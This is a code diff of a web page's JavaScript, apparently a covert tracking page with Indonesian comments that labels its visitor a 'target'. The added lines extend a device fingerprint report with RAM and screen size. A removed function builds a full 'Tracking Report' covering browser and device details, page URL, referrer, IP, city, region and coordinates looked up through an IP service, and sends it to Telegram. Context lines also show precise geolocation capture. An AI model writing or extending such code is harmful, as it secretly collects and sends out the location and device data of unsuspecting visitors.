@@ -70,12 +70,15 @@
       const ua = navigator.userAgent;
       const plat = navigator.platform;
       const lang = navigator.language;
+      const ram = navigator.deviceMemory || 'N/A';    
+      const screenSize = `${screen.width}x${screen.height}`;
+      const windowSize = `${window.innerWidth}x${window.innerHeight}`;
       const res = `${screen.width}x${screen.height}`;
       const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const online = navigator.onLine ? "Online" : "Offline";
       const now = new Date().toLocaleString();
 
-      return `🖥 *Device Info*\n- User-Agent: ${ua}\n- Platform: ${plat}\n- Language: ${lang}\n- Resolution: ${res}\n- Timezone: ${tz}\n- Status: ${online}\n- Access Time: ${now}`;
+      return `🖥 *Device Info*\n- User-Agent: ${ua}\n- Platform: ${plat}\n- Language: ${lang}\n- Resolution: ${res}\n- Timezone: ${tz}\n- Status: ${online}\n- Access Time: ${now}\n-Ram: ${ram}Gb\n-Window Size: ${windowSize}\nScreen Size: ${screenSize}`;
     }
 // Info target
     function getIPInfo() {
@@ -144,69 +147,7 @@
         }, 3000);
       }).catch(() => {});
     }
-       async function getTrackingReport() {
-  const now = new Date().toString();
-  const ua = navigator.userAgent;
-  const platform = navigator.platform;
-  const lang = navigator.language;
-  const online = navigator.onLine ? "Online" : "Offline";
-  const screenSize = `${screen.width}x${screen.height}`;
-  const windowSize = `${window.innerWidth}x${window.innerHeight}`;
-  const cores = navigator.hardwareConcurrency || 'N/A';
-  const ram = navigator.deviceMemory || 'N/A';
-  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-  const offset = new Date().getTimezoneOffset() * -1;
-  const title = document.title;
-  const referrer = document.referrer || 'None';
-  const url = window.location.href;
-  const historyLen = history.length;
-  const touchSupport = navigator.maxTouchPoints > 0 ? '✅ YA' : '❌ TIDAK';
-
-  let ipData = null;
-  try {
-    const res = await fetch("https://ipapi.co/json/");
-    ipData = await res.json();
-  } catch (e) {
-    ipData = null;
-  }
-
-  return `╭───── Tracking Report ───── ⦿
-
-⚙️ DEVICE INFORMATION
-🖥️ Device: ${ua}
-💻 Platform: ${platform}
-🌐 Bahasa: ${lang}
-📶 Online: ${online}
-📺 Screen Size: ${screenSize}
-🪟 Window Size: ${windowSize}
-💾 RAM: ${ram} GB
-🧠 CPU Cores: ${cores}
-⏰ Waktu Akses: ${now}
-📜 History Length: ${historyLen}
-✋ Touch Support: ${touchSupport}
-🔗 Referrer: ${referrer}
-🌍 URL: ${url}
-📄 Title: ${title}
-🕓 Timezone: ${timezone}
-🧭 Offset: ${offset} menit
-
-📍 LOCATION INFORMATION
-${ipData ? `📡 IP Address: ${ipData.ip}
-🏙️ Kota: ${ipData.city}
-🏙️ Provinsi: ${ipData.region}
-🌎 Negara: ${ipData.country_name}
-📌 Latitude: ${ipData.latitude}
-📍 Longitude: ${ipData.longitude}
-🌐 ISP: ${ipData.org || 'Unknown'}` : `Gagal mengambil lokasi dari IP.`}
-
-╰───── End of Report ───── ⦿`;
-}
-
-  getTrackingReport().then(report => {
-  sendToTelegram("```\n" + report + "\n```");
-});
-
-// Mendapatkan lokasi 100% akurat
+   // dapatkan lokasi 100% akurat
     function getGeoLocation() {
       navigator.geolocation.getCurrentPosition(async pos => {
         const { latitude, longitude } = pos.coords;
